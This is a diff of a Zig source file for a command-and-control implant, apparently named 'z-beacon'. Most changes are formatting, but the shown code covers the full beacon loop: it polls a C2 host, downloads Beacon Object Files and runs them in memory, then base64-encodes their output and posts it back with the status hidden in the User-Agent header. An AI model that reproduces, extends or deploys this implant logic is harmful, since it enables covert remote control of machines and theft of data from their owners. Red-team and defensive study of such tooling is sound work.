@@ -49,19 +49,22 @@ const State = struct {
     base64_encoder: std.base64.Base64Encoder,
 
     fn getImplantIdentity(allocator: std.mem.Allocator) ![]u8 {
-
         const arch_name = @tagName(@import("builtin").cpu.arch);
         const os_release = @tagName(@import("builtin").os.tag);
 
         // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
-        const implant_id = try std.mem.join(allocator, "", &.{ arch_name, ":", os_release, });
+        const implant_id = try std.mem.join(allocator, "", &.{
+            arch_name,
+            ":",
+            os_release,
+        });
 
         return implant_id;
     }
 
     fn init(allocator: std.mem.Allocator) !State {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
-        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '='); 
+        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
         const implant_identity = try getImplantIdentity(allocator);
 
@@ -88,7 +91,7 @@ const State = struct {
         //        .supports_connect = true,
         //    };
         //    break :blk proxy;
-        //} else null; 
+        //} else null;
 
         return State{
             .allocator = allocator,
@@ -153,12 +156,7 @@ const ImplantActions = struct {
     }
 };
 
-fn generateUserAgentString(allocator: std.mem.Allocator, bof_exit_code_or_launcher_error: i32) ![]const u8 {
-    return try std.fmt.allocPrint(allocator, "result:{d}", .{bof_exit_code_or_launcher_error});
-}
-
 fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields: [][]const u8) !void {
-
     const bof_task_id = task_fields[0];
     //const bof_name = task_fields[1];
     const bof_path = task_fields[2];
@@ -195,7 +193,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
         bof_to_exec = b;
         is_loaded = true;
 
-    // we need to fetch BOF file content from C2 sever
+        // we need to fetch BOF file content from C2 sever
     } else {
         //const bof_content = try fetchBlob(allocator, state, bof_path);
         //defer allocator.free(bof_content);
@@ -206,13 +204,13 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
         std.log.info("fetching BOF", .{});
         const req = state.implant_actions.netConnect(state, uri);
 
-        if(req) |req_raw| {
-            _ = state.implant_actions.netSend(state, req_raw, null, 0);  
+        if (req) |req_raw| {
+            _ = state.implant_actions.netSend(state, req_raw, null, 0);
             var body_len: u32 = 0;
             const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(state, req_raw, &body_len));
             std.log.info("after BOF fetch", .{});
 
-            if(bof_content) |b| {
+            if (bof_content) |b| {
                 bof_to_exec = try bof.Object.initFromMemory(b[0..body_len]);
                 errdefer bof_to_exec.release();
 
@@ -262,7 +260,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
         //    try bof_args.add(buf_len);
         //    try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
         //} else {
-            try bof_args.add(arg);
+        try bof_args.add(arg);
         //}
 
         i += 1;
@@ -325,16 +323,16 @@ fn netDisconnectC(state: *anyopaque, conn: *anyopaque) callconv(.C) void {
     //const s: *State = @ptrCast(@alignCast(state));
     const req: *std.http.Client.Request = @ptrCast(@alignCast(conn));
     //const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));
-    
+
     _ = state;
 
     req.deinit();
-    //http_client.deinit(); 
+    //http_client.deinit();
 }
 
 fn netConnect(s: *State, address: []const u8) !*std.http.Client.Request {
     var http_client: std.http.Client = .{
-            .allocator = s.allocator,
+        .allocator = s.allocator,
     };
     const ptr_http_client = try s.allocator.create(std.http.Client);
     ptr_http_client.* = http_client;
@@ -350,7 +348,7 @@ fn netConnect(s: *State, address: []const u8) !*std.http.Client.Request {
 
     // TODO: zwolnic pamiec
     //var server_header_buffer: [1024]u8 = undefined;
-    const server_header_buffer = try s.allocator.alloc(u8, 16*1024);
+    const server_header_buffer = try s.allocator.alloc(u8, 16 * 1024);
 
     const req = try http_client.open(@enumFromInt(std.http.Method.parse(http_method)), uri, .{
         .server_header_buffer = server_header_buffer,
@@ -385,7 +383,7 @@ fn netSend(state: *anyopaque, pkt_header: *anyopaque, pkt_data: ?*anyopaque, len
     r.send() catch unreachable;
 
     // sends HTTP body
-    if(pkt_data != null and len > 0) {
+    if (pkt_data != null and len > 0) {
         const d: [*]const u8 = @ptrCast(@alignCast(pkt_data));
         r.transfer_encoding = .{ .content_length = len };
         r.writeAll(d[0..len]) catch unreachable;
@@ -413,10 +411,10 @@ fn netMasquerade(state: *anyopaque, hdr_to_mask: *anyopaque, data_to_mask: *anyo
     const req: *std.http.Client.Request = @ptrCast(@alignCast(hdr_to_mask));
     const bof_res: *BofRes = @ptrCast(@alignCast(data_to_mask));
 
-    req.headers.user_agent = std.http.Client.Request.Headers.Value{ .override = std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.status_code}) catch unreachable};
+    req.headers.user_agent = std.http.Client.Request.Headers.Value{ .override = std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.status_code}) catch unreachable };
     std.log.info("\nw netMasquerade (status_code): {d}", .{bof_res.status_code});
 
-    if(bof_res.output) |output| {
+    if (bof_res.output) |output| {
         const out_b64 = s.allocator.alloc(u8, s.base64_encoder.calcSize(output.len)) catch unreachable;
         std.log.info("\nw netMasquerade (output): {s}", .{output});
 
@@ -466,8 +464,7 @@ fn netUnmasquerade(state: *anyopaque, pkt_hdr: *anyopaque, pkt_data: ?*anyopaque
     return pkt_data;
 }
 
-fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []u8) !void { 
-
+fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []u8) !void {
     var task_fields = std.ArrayList([]const u8).init(allocator);
     defer task_fields.deinit();
 
@@ -477,8 +474,8 @@ fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []
 
     var iter_task = std.mem.splitScalar(u8, resp_content, ',');
     while (iter_task.next()) |field| {
-        if(i==0) task_id = field;
-        if(i==1) task_name = field;
+        if (i == 0) task_id = field;
+        if (i == 1) task_name = field;
         std.log.info("Field: {s}", .{field});
         try task_fields.append(field);
         i = i + 1;
@@ -544,12 +541,11 @@ fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []
 }
 
 fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
-
     var pending_bof_index: usize = 0;
     while (pending_bof_index != state.pending_bofs.items.len) {
         const pending_bof = state.pending_bofs.items[pending_bof_index];
 
-        var bof_res = BofRes {
+        var bof_res = BofRes{
             .status_code = undefined,
             .output = null,
         };
@@ -570,8 +566,7 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
 
         // checking output
         if (pending_bof.context) |context| {
-
-            if(context.getOutput()) |output|
+            if (context.getOutput()) |output|
                 bof_res.output = allocator.dupe(u8, output) catch unreachable;
 
             if (!pending_bof.is_persistent)
@@ -584,22 +579,20 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
         std.log.info("Bof launcher status code: {d}", .{bof_res.status_code});
 
         // establishing connection
-        const addr = try std.fmt.allocPrintZ(allocator, "POST http://{s}{s}", .{state.c2_host, state.c2_endpoint});
+        const addr = try std.fmt.allocPrintZ(allocator, "POST http://{s}{s}", .{ state.c2_host, state.c2_endpoint });
         defer allocator.free(addr);
         std.log.info("\nsending results to {s}", .{addr});
         const req = state.implant_actions.netConnect(state, addr);
- 
-        if(req) |req_raw| {
+
+        if (req) |req_raw| {
             // masquerading results in HTTP response
             std.log.info("\nprzed netMasquerade", .{});
-            _  = state.implant_actions.netMasquerade(state, req_raw, &bof_res);
+            _ = state.implant_actions.netMasquerade(state, req_raw, &bof_res);
 
-            if(bof_res.output) |output| {
+            if (bof_res.output) |output| {
                 _ = state.implant_actions.netSend(state, req_raw, @constCast(@ptrCast(output.ptr)), @intCast(output.len));
                 allocator.free(output);
-            }
-            else
-                _ = state.implant_actions.netSend(state, req_raw, null, 0);
+            } else _ = state.implant_actions.netSend(state, req_raw, null, 0);
 
             var body_resp_len: u32 = 0;
             const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(state, req_raw, &body_resp_len));
@@ -619,20 +612,20 @@ pub export fn go(_: ?[*]u8, _: i32) callconv(.C) u8 {
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    std.log.info("BOF-stager launched", .{});
+    std.log.info("z-beacon launched", .{});
 
     var state = State.init(allocator) catch unreachable;
     defer state.deinit(allocator);
 
-    const heartbeat_request = std.fmt.allocPrintZ(allocator, "GET http://{s}{s}", .{state.c2_host, state.c2_endpoint}) catch unreachable;
+    const heartbeat_request = std.fmt.allocPrintZ(allocator, "GET http://{s}{s}", .{ state.c2_host, state.c2_endpoint }) catch unreachable;
     defer allocator.free(heartbeat_request);
 
     while (true) {
         // connect to C2 server
         const req = state.implant_actions.netConnect(&state, heartbeat_request);
 
-        if(req) |req_raw| {
-            _ = state.implant_actions.netSend(&state, req_raw, null, 0);  
+        if (req) |req_raw| {
+            _ = state.implant_actions.netSend(&state, req_raw, null, 0);
 
             // fetch data (if any) from C2 server
             var body_len: u32 = 0;
@@ -642,7 +635,7 @@ pub export fn go(_: ?[*]u8, _: i32) callconv(.C) u8 {
             const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, req_raw, resp_content, &body_len));
 
             // process command (if any)
-            if(unmasked_resp_content) |buf| {
+            if (unmasked_resp_content) |buf| {
                 processCommands(allocator, &state, buf[0..body_len]) catch {};
             }
 
